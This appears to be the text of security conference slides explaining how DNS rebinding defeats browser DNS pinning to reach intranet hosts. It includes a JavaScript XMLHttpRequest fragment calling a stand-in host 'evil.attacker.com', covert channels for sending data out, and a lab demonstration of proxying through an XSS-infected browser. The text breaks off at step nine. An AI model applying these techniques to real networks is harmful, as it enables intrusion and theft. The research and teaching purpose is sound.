Intranet Invasion 
Through Anti-DNS Pinning
David Byrne, CISSP, MCSE 
Security Architect 
EchoStar Satellite / Dish Network 
PI:EMAIL
JavaScript Malware
• Cross Site Scripting (XSS)
• Port scanning
• Web site fingerprinting
• Cross Site Request Forgery (CSRF)
• Browser history theft
• Self-propagating worms
Same Origin Policy
• Netscape started it in Navigator 2 when JavaScript 
debuted
• “The same origin policy prevents 
documents or scripts loaded from one 
origin from getting or setting 
properties of a document from a 
different origin.” – Mozilla.org
• Both documents must have the same protocol, the 
same hostname the and same port; IP address must 
be ignored because of virtual hosts
• Cross Site Scripting gets around this by injecting 
JavaScript into the targeted site. Without rare client- 
side vulnerabilities, a properly secured site is not 
vulnerable 
Useful data
Victim browser
Attack Web Server 
13.1.2.3
Victim Web Server 
10.4.5.6
Attack DNS Server 
attacker.com
Attack code
Request
13.1.2.3
evil.attacker.com
10.4.5.6
Attack request
Useful data
DNS Pinning
• Intended to prevent DNS spoofing attacks
• It forces a browser to pin the first DNS 
response for a hostname 
• The first attack against it was documented in 
1996 by Princeton researchers. Their attack 
was against the JVM and is no longer viable.
• May violate RFC 2616
RFC 2616: Hypertext Transfer 
Protocol -- HTTP/1.1 
15.3 DNS Spoofing
…
If HTTP clients cache the results of host name lookups in order 
to achieve a performance improvement, they MUST observe 
the TTL information reported by DNS.
If HTTP clients do not observe this rule, they could be spoofed 
when a previously-accessed server's IP address changes. As 
network renumbering is expected to become increasingly 
common, the possibility of this form of attack will grow. 
Observing this requirement thus reduces this potential security 
vulnerability.
Defeating DNS-Pinning – 
Process Termination
1. Get the victim browser to request an attack 
payload
2. Wait for the browser to close, or cause it to crash
3. Wait for the user to open the browser again
4. Get the browser to reload the payload from cache
5. The payload initiates a request to the attack 
server it came from originally
6. The browser re-queries the DNS server, but this 
time it receives the IP address of the target server
7. The payload is run against the target server
Defeating DNS-Pinning – 
Process Termination
• Pros
– Difficult to defeat with browser design; the 
browser must requery DNS eventually
• Cons
– Defeated by clearing the cache on exit
– Difficult to get attack payload reloaded 
from cache
– Very, very slow
Defeating DNS-Pinning – 
Forcing Cache Reloads
• History
– First documented in September, 2003 by Mohammad Haque
– Ignored until August, 2006 when Amit Klein brought it up 
again
• Major browsers (IE & Firefox) don’t fully implement 
DNS pinning 
• If a web server becomes unavailable, the DNS cache 
is dumped
• Coordinating firewall and DNS changes makes for an 
effective attack
• The techniques demonstrated are possible on IE & 
Firefox; on Windows & *NIX
Useful data
Victim browser
Attack Web Server 
13.1.2.3
Victim Web Server 
10.4.5.6
Attack DNS Server 
attacker.com
Attack code
Request
13.1.2.3
evil.attacker.com
10.4.5.6
Attack request
Useful data
Attack request
XMLHTTPRequest Object
•The XMLHTTPRequest (XHR) object allows 
JavaScript to issue arbitrary HTTP GETs or 
POSTs back to the origin server
•Used commonly in AJAX sites such as 
Google Maps
•Normally, it can only return text data
•Thanks to Marcus Granado 
(mgran.blogspot.com) for documenting how 
to retrieve binary data using the “x-user- 
defined” character set.
XMLHTTPRequest Code
var ua; 
ua = new XMLHttpRequest(); 
ua.open('GET', 'http://evil.attacker.com', false); 
ua.overrideMimeType('text/plain;charset=x-user-defined'); 
ua.send(body); 
return "HTTP/1.0 " + ua.status + " " + ua.statusText + 
"\x0d\x0a" + ua.getAllResponseHeaders() + 
"\x0d\x0a\x0d\x0a" + 
ua.responseText;
Sending Data 
to the Attack Server
• Small amounts of text data:
– Create an image object
– Set source to a controller script on the attack server; the text 
data is passed in the query string
– Append object to document body
• Large amount of data, or binary data
– HTML form
– Data in text input box
– Action set to the controller script on the attack server
– Target set to an unused iframe
– Method set to POST
– Encoding type to “multipart/form-data”
Requesting Data from the 
Attack Server
• Primary method uses intentional XSS
• A script is loaded from the attack server; the 
data is stored in variables that the requesting 
script can access
data['request345'] = 'GET / HTTP/1.0\n…';
• Anti-XSS controls might break this
• No XSS is required for the demonstration
Requesting Data from the 
Attack Server - Alternatives
• Image dimensions
– Request a series of images from the attack server
– Measure their width and height; one byte encoded in each
– BMP files can be as small as 66 bytes with any dimensions
• Cascading Style Sheets
– Request a style sheet from the attack server
– It contains series of style classes with margin settings
– Apply the class to a DIV tag, and measure the margin
– Each margin can be millions of pixels, allowing two bytes to 
be encoded for each side
– Unlimited data in each CSS
Demonstration Environment
Internet 
12.0.0.0/24
Corporate 
10.0.0.0/24
Victim 
workstation 
10.0.0.100
Linux Server 
10.0.0.30 
HTTP; MySQL
Windows Server 
10.0.0.31 
HTTP;DNS;SMB
TCP/53,80,443;UDP/53
TCP/80,443
TCP/80,443
Attack Server 
12.0.0.51, 12.0.0.52 
HTTP, MySQL, DNS
Attack 
workstation 
12.0.0.60
XSS Infected Server 
12.0.0.80 
HTTP
Demonstration Environment
Internet Laptop 
Attack server VM 
Attack workstation VM 
XSS infected server VM
Corporate Laptop 
Windows server VM 
Linux server VM 
Victim workstation VM
DD-WRT Firewall
With assistance from Eric Duprey
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
XSS Infected Server
Demonstration Sequence
Victim 
workstation
Victim 
workstation
Linux Server
Windows Server
Attack Server
Attack 
workstation
XSS Infected 
Server
1. Victim browser visits a website infected with a XSS attack and 
becomes infected with malicious code.
http://www.news-site.com/infected_page.asp
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Victim 
workstation
Linux Server
Windows Server
Attack 
workstation
XSS Infected 
Server
2. The malicious code causes the victim to load a page from the 
attack web server. This could be in a new window, in a small iframe, 
etc.
http://12.0.0.51/attack.html
Attack Server
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Victim 
workstation
Linux Server
Windows Server
Attack 
workstation
XSS Infected 
Server
3. Every 1.5 seconds, JavaScript from the attack page appends a 
 tag to the document body. The source is set to the 
controller script, with a command value indicating a poll
http://12.0.0.51/cgi-bin/controller.pl?command=poll&sessionID=10
Attack Server
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
Attack 
workstation
XSS Infected 
Server
4. On the first poll, the controller script records the session in the 
database, which allows the attacker to see it in the console
Attack Server
INSERT INTO sessions 
(sessionID, externalIP, lastPoll, firstPoll, proxyState) 
VALUES (?, ?, ?, ?, ?)
Victim 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Victim 
workstation
Linux Server
Windows Server
Attack 
workstation
XSS Infected 
Server
5. The controller script checks for new commands in the attack 
database. Any commands are sent back to the victim browser as 
JavaScript statements.
Attack Server
alert('I own you');
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Victim 
workstation
Windows Server
XSS Infected 
Server
6. The attacker can probe the victim’s network using a number of 
well documented techniques.
Attack Server
Linux Server
Attack 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
7. The attacker starts up an HTTP proxy server associated with the 
desired browser victim.
Attack 
workstation
Victim 
workstation
Attack Server
http://12.0.0.51/cgi-bin/controller.pl?command=startproxy&sessionid=10
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
8. When the attacker sends a request to the HTTP proxy, the proxy 
checks to see if any requests have been sent out to that IP address 
on the same port. 
Attack 
workstation
Victim 
workstation
Attack Server
http://10.0.0.30/
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
9.If this is the first request, the proxy creates a random hostname 